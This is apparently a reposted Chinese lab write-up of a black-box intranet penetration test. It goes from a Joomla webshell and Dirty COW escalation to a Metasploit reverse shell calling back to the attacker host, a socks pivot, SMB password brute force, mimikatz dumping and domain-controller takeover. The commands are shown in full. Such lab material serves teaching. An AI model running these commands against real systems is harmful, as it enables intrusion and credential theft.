> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ltHEEg5GoPu54CxdOU8sWA)

实战步骤 & 知识点：
===========

```
前言
环境搭建
内网信息搜集
  nmap探测端口
  连接mysql
  登录joomla后台
  绕过disable_functions
  Nginx反向代理
  脏牛提权
内网渗透
  centos上线msf
  socks代理进入内网扫描
  永恒之蓝尝试
  密码枚举
  psexec横向移动
```

1、前言
====

本环境为黑盒测试，在不提供虚拟机帐号密码的情况下进行黑盒测试拿到域控里面的 flag。

2、环境搭建
======

攻击机：

kali：192.168.1.10

靶场：

CentOS(内)：192.168.93.100

CentOS(外)：192.168.1.110

Ubuntu：192.168.93.120

域内主机：

Winserver2012：192.168.93.10

Winserver2008：192.168.93.20

Windows7：192.168.93.30

kali 跟 CentOS 能够 ping 通

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdkgaUPtV3veJvSanzsVLx4C4wmdRQcFQzVicH1hNGhiaeInmElCq7qRfA/640?wx_fmt=png)

拓扑图如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdJNGGDM5BZBnBknQ1rb8zsyElibYlDXNu6Eq2JhJmEJuJGakOzibmCibCQ/640?wx_fmt=png)

3、内网信息搜集
========

**3.1 nmap 探测端口**
-----------------

nmap 先探测一下出网机即 CentOS 的端口情况。可以看到开了 22、80、3306 端口，初步判断开了 web，ssh，数据库应该为 MySQL

```
nmap -T4 -sC -sV 192.168.1.110
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdpTxoQFpIhs4jFWSUUJcsutD1s9rqR9tb5qBr43XhJQkrxRJb9TnYHw/640?wx_fmt=png)

这里首先访问下 80 端口，发现为 joomla 框架，joomla 框架在 3.4.6 及以下版本是有一个远程 rce 漏洞的，这里先使用 exp 直接去打一下  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdOWWIhXYzR1PWvURlZDxa2D9q2h7r8v3MyqY5EaOJm2maibQJrukzN5Q/640?wx_fmt=png)

这里看到 exp 打过去不能够利用那么应该是 joomla 的版本比较高

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdpUFxXFt0tv1yXxbt5tswQOGD7OjlygZvX8O9OqtbjqFJDLOMXPq0Dw/640?wx_fmt=png)

这里使用端口扫描软件扫一下后台的文件发现一个管理员的界面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdeRZ7vVHxTHywKtibod3K5YJGY0wly1zenibtr3nbN6Law6PzU9kmaH5g/640?wx_fmt=png)

是 joomla 的后台登录界面，这里尝试使用 bp 弱口令爆破了一下，无果，只好放弃

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdqgEKehwibdXluP2AbSVUwFTXFCAJtQWgWIEiaV4c8LyAX65kxaMBO3OA/640?wx_fmt=png)

这里使用 dirsearch 进一步进行扫描，发现了一个`configuration.php`  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdOmQIJJW74twlX0iaVg2MaRqCL5nF5y9MUPTWNzxAFlbnvTJpxDgWUgQ/640?wx_fmt=png)

看一下这个 php 的内容发现有一个 user 跟 password，联想到开了 3306 这个端口，猜测这可能是管理员备份的数据库密码忘记删除了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdNtUsTMySAQCzQ9ZeMHCrtFIKc1MFMUlczvFNZTnrRcIvS5TXKyKibWA/640?wx_fmt=png)

**3.2 连接 mysql**
----------------

这里使用 navicat 尝试连接一下靶机的数据库

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdZDbKUZGic7Y9qfbnXWpgqaD86OaJEibZGjXTibugLiaWnn8jlbXaNdSjBA/640?wx_fmt=png)

可以看到连接成功了  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdxcclbOy8COB9fSpybeUl1Y2aRicQ4uAVImFT159Ot5PxoYjG9R8V5bA/640?wx_fmt=png)

然后就是翻数据找管理员的帐号了，找管理员帐号肯定是找带有 user 字段跟 password 字段的，这里我找了一段时间，最后发现`umnbt_users`这个表跟管理员帐号最相似，但是这里出现了一个问题，我发现`password`这个地方的密码不是明文

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdGBCtibrYNJHPRUD7UfDVDGR08QWKnyFOLmu1OCsMY1UnZTfI4iawibmQQ/640?wx_fmt=png)

这里试着把密文拿去解密发现解密失败

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdmdaa5q4mb1NEj6XTicBDJ0mHgvfgJ2XSkXooljbzGV5jQOObmnJDcvg/640?wx_fmt=png)

在搜索的时候发现 joomla 官网虽然没有直接公布密码的加密方式，但是它为了防止用户忘记密码增加了一个添加超级管理员用户的方式，就是通过登录数据库执行 sql 语句达到新建超级管理员的效果

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdtw032tCCaHYbP5JrSeHP3Rt1cerkFsS5A53DaTcmgGKyC2zyrGAr4Q/640?wx_fmt=png)

这里我们可以发现 sql 语句中的`VALUES`中的第三项为密文，这里我们为了方便就是用他给我们的这一串密文，这里对应的密码为`secret`，当然也可以用其他对应的密文如下所示

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZd2xPGtWkMQfBNnibJUSqZwibFLU2BW33iaj6uQqHKoCsUgjKPRibD1DJiaug/640?wx_fmt=png)

在 navicat 中执行 sql 语句，注意这里要分开执行两个`INSERTINTO`否则回报错，这里相当于我们添加了一个`admin2secret`这个新的超级管理员用户

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZd1P7emxyf4OAoXLTgWibibHmbnh0rdbiamaMkmMb17t6KcuTntGC5LUsjQ/640?wx_fmt=png)

**3.3 登录 joomla 后台**
--------------------

使用`admin2 secret`登录 joomla 后台

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdcEk5TPN8TWzBtg7lwiaicXKygnn1rC4ZQoGFsOoGGOUbcvTtZfrgyqNQ/640?wx_fmt=png)

登录成功，进入后台后的操作一般都是找可以上传文件的地方上传图片马或者找一个能够写入 sql 语句的地方

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdfqRmgGFWYBcuiawPKGf2bQzS66r8V9pxcuaia6C3y0ecrl3Y0vmhmYyw/640?wx_fmt=png)

这里经过谷歌后发现，joomla 的后台有一个模板的编辑处可以写入文件，这里找到`Extensions->Template->Templates`  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdqYYqUXdJJGbmLMdoA7toj2qiaqk56wo4sWz1C3LA6XAluJMetwO9rhA/640?wx_fmt=png)

这里选择`Beez3`这个模板进入编辑

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZd4yopkSVPwwjYPyNmicap6SVj0Fic1ggB1r9IKO4t8icxadaXIDJLiaNmOg/640?wx_fmt=png)

这里因为模板前面有`<?php`前缀，所以这里我们需要将一句话木马稍微变形一下，然后保存即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdNSkJ1bSpeCRmZZBzlviaH5o7iaznPjantg86rcicnsUVib5IVzDa6lxibvA/640?wx_fmt=png)

这里使用蚁剑连接成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdiaIk2J0gSICicm8RHEuTicicWHvvqBLM6zKKlawgxjOib7nPJasnFbhhL2g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdkwZxFNI7FTrX6Wb4Vic0Gg1x9gpNgkZNicliaKpQ9zZoICf1eNkx2FhicQ/640?wx_fmt=png)

**3.4 绕过 disable_functions**
----------------------------

但是这里命令执行返回的是 127，应该是`disable_functions`禁用了命令执行的函数，在 windows 下绕过`disable_functions`的方法虽然很少，但是在 linux 里面绕过`disable_functions`的方法却有很多，这里就不展开说了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdYEe2jT5hZH4ra3soEbHdtfhyxgDVf6rqVUQVSUBG19ln6zUOvsGubg/640?wx_fmt=png)

这里为了方便我直接使用的是蚁剑里自带的插件绕过`disable_functions`，可以看到已经上传脚本操作成功了  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZd5GX1JwdtGdJfBYuAbbfvBElDB3F5MBeyjVPicZhjh6lIia27vWlOoibeg/640?wx_fmt=png)

这里我直接去连接上传的这个`.antproxy.php`，这里理论上是应该用原来的密码连接过去就可以执行命令了，但是这和地方不知道为什么返回数据为空我淦！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdXjWFvdf0P1ibde6AibTBNricOjN0EhCyAQE1BIJE2GYoHfp0R4m8pXMwA/640?wx_fmt=png)

这里只好用最原始的方法，上传一个绕过`disable_functions`的 py，通过传参的方式执行系统命令  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdPPxjxXD7HhlrSQrudBJicnkYo1YHbMRyWtMJibjNr6JibV4HicLSaqc9bg/640?wx_fmt=png)

测试一下传参为 whoami，可以看到这里是一个低权限`www-data`  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdbicQdiahmQcYUh7zzdnibFfvkPxkgMx38SM1SOmLsfwwAMSSBNJUsSgfQ/640?wx_fmt=png)

`ifconfig`看一下网卡情况，这里很奇怪，因为之前我们在扫描的时候这台 CentOS 的 ip 应该是 192.168.1.0/24 这个网段的，但是这里 ifconfig 出来却是 192.168.53.0/24 这个网段，当时说实话有点懵

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdejeiaM5D3icSAzKGZ21TbWymHDhaibyZuM14qOicBqDfSkzKEL9G1IUc2w/640?wx_fmt=png)

`arp -a`查看下路由表，可以看到都是 192.168.93.0/24 这个网段

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdib2yf5wccnKsDib4lfzmj5E2teaSmKAptwP2FxBQfAYuAS5sOkSMFzRw/640?wx_fmt=png)

再看一下端口的进出，发现都是 93 这个网段

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZd5WIGp3WibRaYojp8ic5IpzY2qiaGMr8KJicOShJk2VQcxF8ALg1m904HibQ/640?wx_fmt=png)

interfaces 中配置的静态网卡也是 93 这个网段  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdujEMKoMLFO3Y0q37X9icic6OUDX2RoO6C8dCZoOnxROkWAYJTOPY9U1A/640?wx_fmt=png)

**3.5 Nginx 反向代理**
------------------

那么到这里已经很明显了，也就是说我们之前拿到的那台 linux 的 192.168.1.0/24 这个网段相当于一个公网 IP，但是真正的主机应该是 192.168.93.0/24，但这个是一个内网网段，所以说最符合这种情况的就是 nginx 反向代理

因为之前 nginx 反代的情况基本没遇到过，所以这里顺带补充一下自己的盲区

**何为代理**

在 Java 设计模式中，代理模式是这样定义的：给某个对象提供一个代理对象，并由代理对象控制原对象的引用。

可能大家不太明白这句话，在举一个现实生活中的例子：比如我们要买一间二手房，虽然我们可以自己去找房源，但是这太花费时间精力了，而且房屋质量检测以及房屋过户等一系列手续也都得我们去办，再说现在这个社会，等我们找到房源，说不定房子都已经涨价了，那么怎么办呢？最简单快捷的方法就是找二手房中介公司（为什么？别人那里房源多啊），于是我们就委托中介公司来给我找合适的房子，以及后续的质量检测过户等操作，我们只需要选好自己想要的房子，然后交钱就行了。

代理简单来说，就是如果我们想做什么，但又不想直接去做，那么这时候就找另外一个人帮我们去做。那么这个例子里面的中介公司就是给我们做代理服务的，我们委托中介公司帮我们找房子。

**何为反向代理**

反向代理和正向代理的区别就是：**正向代理代理客户端，反向代理代理服务器。**

反向代理，其实客户端对代理是无感知的，因为客户端不需要任何配置就可以访问，我们只需要将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据后，在返回给客户端，此时反向代理服务器和目标服务器对外就是一个服务器，暴露的是代理服务器地址，隐藏了真实服务器 IP 地址。

**反向代理的好处**

那么为什么要用到反向代理呢，原因有以下几点：

1、保护了真实的 web 服务器，web 服务器对外不可见，外网只能看到反向代理服务器，而反向代理服务器上并没有真实数据，因此，保证了 web 服务器的资源安全

2、反向代理为基础产生了动静资源分离以及负载均衡的方式，减轻 web 服务器的负担，加速了对网站访问速度（动静资源分离和负载均衡会以后说）

3、节约了有限的 IP 地址资源，企业内所有的网站共享一个在 internet 中注册的 IP 地址，这些服务器分配私有地址，采用虚拟主机的方式对外提供服务

了解了反向代理之后，我们再具体的去探究一下 Nginx 反向代理的实现

1、模拟 n 个 http 服务器作为目标主机用作测试，简单的使用 2 个 tomcat 实例模拟两台 http 服务器，分别将 tomcat 的端口改为 8081 和 8082

2、配置 IP 域名

```
192.168.72.49 8081.max.com
```

```
192.168.72.49 8082.max.com
```

3、配置 nginx.conf

```
upstream tomcatserver1 {
```

```
    server 192.168.72.49:8081;
```

```
    }
```

```
upstream tomcatserver2 {
```

```
    server 192.168.72.49:8082;
```

```
    }
```

```
server {
```

```
        listen       80;
```

```
        server_name  8081.max.com;
```

```
        #charset koi8-r;
```

```
        #access_log  logs/host.access.log  main;
```

```
        location / {
```

```
            proxy_pass   http://tomcatserver1;
```

```
            index  index.html index.htm;
```

```
        }    
```

```
    }
```

```
server {
```

```
        listen       80;
```

```
        server_name  8082.max.com;
```

```
        #charset koi8-r;
```

```
        #access_log  logs/host.access.log  main;
```

```
        location / {
```

```
            proxy_pass   http://tomcatserver2;
```

```
            index  index.html index.htm;
```

```
        }       
```

```
    }
```

流程：  
1）浏览器访问 8081.max.com，通过本地 host 文件域名解析，找到 192.168.72.49 服务器（安装 nginx）  
2）nginx 反向代理接受客户机请求，找到 server_name 为 8081.max.com 的 server 节点，根据 proxy_pass 对应的 http 路径，将请求转发到 upstream tomcatserver1 上，即端口号为 8081 的 tomcat 服务器。

那么这里很明显还有一台 linux 主机在整个拓扑内做为内网 Ubuntu 的反向代理主机，这时候我翻缓存文件夹的时候发现了一个 mysql 文件夹，跟进去看看

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdG9tZmTDJjC0eJR0priahqSCLQU3I9NRVyr0Nvc9xK3QAVibicIrSopHiaA/640?wx_fmt=png)

发现了一个 test.txt，不会又是管理员忘记删了的账号密码吧 (手动狗头)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdG0MzTYUAL7uL8icmbW6MjW7BibYtYRnUkpBWrdWv6ibknDYfrE3wYTmEA/640?wx_fmt=png)

因为之前我们扫端口的时候发现开了 22 端口，那么这个账号密码很可能就是 ssh 的帐号密码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdIOZppqdanspSPVCibalHzRlRVu31ZHQPUVGIibyFwCEYgfdNA7M8ATEQ/640?wx_fmt=png)

使用 ssh 连接尝试

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdL6TT5dLib3YEvibtpvT0ibvIDmkSbriaboWJNNCQUMIE6Z5sRgVLiasKycg/640?wx_fmt=png)

连接成功到了另外一台 linux 主机

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdicCzoERNia8ExmkFfPZ6Ecb4yvdR49E2Ujibmh3v6NC2EQV96Ivg6KNCA/640?wx_fmt=png)

看一下主机和 ip 情况，可以发现这台主机已经不是我们之前的那台 Ubuntu 了，而是 CentOS，而且双网卡，一张网卡是我们之前扫描时候得出的 1.0/24 这个网段的 ip，还有一个 ip 就是 93.0/24 这个内网网段的 ip，那么这台 linux 主机就是 Ubuntu 的反向代理主机无疑了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdeEnua55Al9l8LhxWsqKfx4QeibOn0LqU428okIl78aOfsk6edthbzhA/640?wx_fmt=png)

**3.6 脏牛提权**
------------

这里直接选择 linux 提权首选的脏牛进行提权

```
gcc-pthreaddirty.c-odirty-lcrypt   //编译dirty.c
```

```
./dirty123456  //创建一个高权限用户，密码为123456
```

可以看到这里已经执行成功，脏牛执行成功过后会自动生成一个名为`firefart`的高权限用户，密码就是我们刚才设置的 123456

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdUPGoAgR2jZEXhhGicN6S1bQA1VHibTsscGNVFHY0IibATa11Xm5FbzXWg/640?wx_fmt=png)

这里我们切换到`firefart`用户进行查看

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdLw6s2hKO4ygE4rSYIwsE5GicWSat475ibrJ3Xf3q0Vvyk9Pib7YunXMPQ/640?wx_fmt=png)

**4、内网渗透**
==========

**4.1 centos 上线 msf**
---------------------

这里因为是 linux 的原因，就不使用 cs 上线的打法了，先生成一个 linux 的 payload 上线到 msf

```
use exploit/multi/script/web_delivery
```

```
set lhost 192.168.1.10
```

```
set lport 4444
```

```
set target 7
```

```
run
```

运行之后会给出一个 payload

```
use exploit/multi/script/web_delivery
```

```
set target 7   
```

```
set payload linux/x64/meterpreter/reverse_tcp
```

```
set lhost 192.168.1.10
```

```
set lport 4444
```

```
exploit
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdqN3YJiawtPlrL3ugKBWJrzttN40pdNm0XyGt8YiaRNcrbUiaH7HhoIkMQ/640?wx_fmt=png)

将 payload 复制到 centos 执行  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZd8icMFDTtKLhFyfy3jFnL3UibU4DsQuVyb5xgD1vuYydt5eSSSdOF3D3g/640?wx_fmt=png)

可以看到反弹 session 已经成功  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdS6pOKMwVl3YXpPRoDxnKXUTR3v3icOYlict8uWkgDz9hTpUuJZl1KXNA/640?wx_fmt=png)

**4.2 socks 代理进入内网扫描**
----------------------

这里使用添加路由、使用`socks_proxy`模块进入内网

```
route add 192.168.93.0 255.255.255.0 1
```

```
route print
```

```
use auxiliary/server/socks_proxy
```

```
set version 4a
```

```
run
```

然后在`/etc/proxychain.conf`文件中添加代理的 ip 和端口，这里一定要和设置里的对应

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdQiaX2EicVH7zuIbzqq6L9YGLrh1VE4ZsoChrZIDVUicnMUnKDppAvZ5hQ/640?wx_fmt=png)

这里可以使用`proxychain + nmap`进行扫描，这里为了方便我就直接使用 msf 中的模块对 192.168.93.0/24 这个网段进行扫描了。注意这里在实战的时候可以适当把线程调小一点，不然流量会很大，这里因为是靶场的原因我就直接调成了 20

```
use auxiliary/scanner/discovery/udp_probe
```

```
set rhosts 192.168.93.1-255
```

```
set threads 20
```

```
run
```

这里扫描完之后可以发现，内网里有 3 台主机存活，分别是 192.168.93.10 192.168.93.20 192.168.93.30

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdzzCsG602kn5Rp6KkCYibGeicNVK3kVCTjpLwKaNtFG0EPb9qzSmN9bxA/640?wx_fmt=png)

但是这时候信息还不够，调用 nmap 继续扫描详细信息

```
nmap -T4 -sC -sV 192.168.93.10 192.168.93.20 192.168.93.30
```

首先是 10 这台主机，可以看到开放了 88 跟 389 这两个端口，熟悉的师傅都应该知道这两个端口大概率锁定了这台主机就是域控

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdicoSkvEUp8fgL61uiaw1fia4fnHbaFz8Es8KUxvMiaPicMUP4jDLfZaQtng/640?wx_fmt=png)

20 这台主机开的都是几个常规端口，值得注意的就是 1433 端口，意味着 20 这台主机上有 mssql 服务

30 这台主机也是开了几个常规端口，跟前面两台主机相比就没什么特征端口，应该是一个普通的域成员主机

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdZIGb2fIVuvPkzjSErGmO8jGVrLuy202fBrDPPqjeBD57yG2bGHUV9w/640?wx_fmt=png)

**4.3 永恒之蓝尝试**
--------------

这里我发现三台主机都开了 139、445 端口，那么先使用永恒之蓝模块先批量扫描一波看有没有可以直接用永恒之蓝打下来的主机

这里没有能够直接用永恒之蓝拿下的主机，win7 跟 2008 匿名管道都没有开所以利用不了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZd0lpRufOPwMB3tn7e11ciclOPqRCpO4kVKloPoWrj7KUFb1ePJXMMq9A/640?wx_fmt=png)

**4.4 密码枚举**
------------

因为这三台主机都开了 445 端口，可以使用 smb，使用 msf 中的`smb_login`模块进行密码枚举尝试

```
use auxiliary/scanner/smb/smb_loginset rhosts 192.168.93.20set SMBUser Administratorset PASS_FILE /tmp/1W.txtrun
```

这里很幸运，跑出来的密码是`123qwe!ASD`刚好在我的`1W.txt`这个字典里面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdD9xLjZvaEVNSvYibTaic8jkFkyoA0PRJu98Lqug3P10CSljVYPop7tHA/640?wx_fmt=png)

**4.5 psexec 横向移动**
-------------------

这里使用 proxifier 将 msf 的 socks 代理到本地，忘记截图了 orz...

这里既然已经拿到了 administrator 的密码，使用 ipc 先连接到 20 这一台主机，使用 copy 命令将 mimikatz 拷贝到 20 这台主机上

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdia4XOAsVRlJ3mNo801UkyYVb3ugSkRgicicZjNeapPbfxSHqicXjrP5Hdg/640?wx_fmt=png)

然后使用 psexec 获取一个 cmd 环境，使用 mimikatz 抓取 hash 并保存为日志

```
psexec64.exe \\192.168.93.20 cmdmimiKatz.exe log privilege::debug sekurlsa::logonpasswords
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdtq0Huev8e2UtibAQlibaesRPIz0gw8AwnRiaiaIuialoQAPj68xxSQQtAmw/640?wx_fmt=png)

`type mimikatz.log`读取日志内容可以发现域管的帐号密码为`Administrator zxcASDqw123!!`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZd5iaYTuibJmfOxjZ9DTTgwMQg5GZWawa0hS8X2XAhRAfcbQiaCYibHXAe7Q/640?wx_fmt=png)

那么这里也直接使用 ipc 连接直接连接 10 这台主机，即 TEST 这个域的域控，可以看到已经连接成功了  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZd1KeD7D4jv06BHeIBptddL9wdUS9WFUKtzibWicYwzK55Kc6V1cbCUhtw/640?wx_fmt=png)

使用命令查看机密文件

```
dir \\192.168.93.10\C$\users\Administrator\Documentstype \\192.168.93.10\C$\users\Administrator\Documents\flag.txt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONTQMhcVGMvrwAByvDtCeKZdZrARyFqEib9g0Ckmr2FzibtUlfCRaPv0ZT0LIgia5pzl0hSoMry8KO13Q/640?wx_fmt=png)

作者：zanthoxylum 

引用链接：https://xz.aliyun.com/t/9840

**推荐阅读：**

  

_**渗透实战系列**_

  

  

▶[【渗透实战系列】19 - 杀猪盘渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486570&idx=1&sn=0c20fbbf4adbeb5b555164438b3197f7&chksm=ce67a6f3f9102fe51b76482cd7d6bb644631ae469d8c1802956034077137ecd49ea56c8d2b1f&scene=21#wechat_redirect)

▶[【渗透实战系列】18 - 手动拿学校站点 得到上万人的信息（漏洞已提交）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486527&idx=1&sn=c1d4f51269e16d5dfdf110c91a8f19e4&chksm=ce67a6a6f9102fb07ad71789894824f553bd1207a3637da8a79b42868a9a9db900fb6d8aa358&scene=21#wechat_redirect)

▶[【渗透实战系列】|17 - 巧用 fofa 对目标网站进行 getshell](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486499&idx=1&sn=7b8c8acc40e1281f1e388f799e7d2229&chksm=ce67a6baf9102facdd7d574719c51e33521308d9b76f53e5462c59674c9d38f18f213e8b1920&scene=21#wechat_redirect)

▶[【渗透实战系列】｜16 - 裸聊 APP 渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486466&idx=1&sn=121b62ef2740e8474119c3914d363e4c&chksm=ce67a69bf9102f8deac87602cbb4504f9a59336fb0113f728164c65048d0962f92dd2dd66113&scene=21#wechat_redirect)

▶[【渗透实战系列】｜15 - 博彩网站（APP）渗透的常见切入点](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486411&idx=1&sn=e5227a9f252f797bf170353d18222d6a&chksm=ce67a152f9102844551cf537356b85a6920abb084d5c6a26f7f8aea6870f51208782ac246ee2&scene=21#wechat_redirect)

▶[【渗透实战系列】｜14 - 对诈骗（杀猪盘）网站的渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486388&idx=1&sn=cfc74ce3900b5ae89478bab819ede626&chksm=ce67a12df910283b8bc136f46ebd1d8ea59fcce80bce216bdf075481578c479fefa58973d7cb&scene=21#wechat_redirect)

▶[【渗透实战系列】｜13-waf 绕过拿下赌博网站](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486335&idx=1&sn=4cb172171dafd261c287f5bb90c35249&chksm=ce67a1e6f91028f08de759e1f8df8721f6c5a1e84d8c5f0948187c0c5b749fa2acdd4228b8e7&scene=21#wechat_redirect)

▶[【渗透实战系列】｜12 - 渗透实战， 被骗 4000 花呗背后的骗局](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486245&idx=1&sn=ebfcf540266643c0d618e5cd47396474&chksm=ce67a1bcf91028aa09435781e951926067dcf41532dacf9f6d3b522ca2df1be8a3c8551c1672&scene=21#wechat_redirect)

▶[【渗透实战系列】｜11 - 赌博站人人得而诛之](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486232&idx=1&sn=301810a7ba60add83cdcb99498de8125&chksm=ce67a181f9102897905ffd677dafeb90087d996cd2e7965300094bd29cba8f68d69f675829be&scene=21#wechat_redirect)

▶[【渗透实战系列】|10 - 记某色 X 商城支付逻辑漏洞的白嫖（修改价格提交订单）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486060&idx=1&sn=a4b977e9e3bbfe7b2c9ec479942e615c&chksm=ce67a0f5f91029e30c854eb2f71173efe925a38294fd39017708abcf4deea5c2b25dee518ebf&scene=21#wechat_redirect)

▶[【渗透实战系列】|9 - 对境外网站开展的一次 web 渗透实战测试（非常详细，适合打战练手）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486042&idx=1&sn=4022c7f001ca99dc6837d51b759d5104&chksm=ce67a0c3f91029d5f1ac9dc24d23cb390630db1cc3f8e76398cf097a50e29e0b98e9afcb600a&scene=21#wechat_redirect)

▶[【渗透实战系列】|8 - 记一次渗透测试从 XSS 到 Getshell 过程（详细到无语）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486005&idx=3&sn=55aad92a300e5a6410aa194b521e11b2&chksm=ce67a0acf91029ba5cd51fbe7c5682fd3eab8a257cf1f6bae44fdaa871bbac7edd51440e4cf8&scene=21#wechat_redirect)

▶[【渗透实战系列】|7 - 记一次理财杀猪盘渗透测试案例](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485901&idx=1&sn=84b5dac005c838c1b6d22fc4207c81c1&chksm=ce67a354f9102a42260468d305734ed7ea437715ee508f2b3eeb8afa0727b7f4ae652909ff44&scene=21#wechat_redirect)

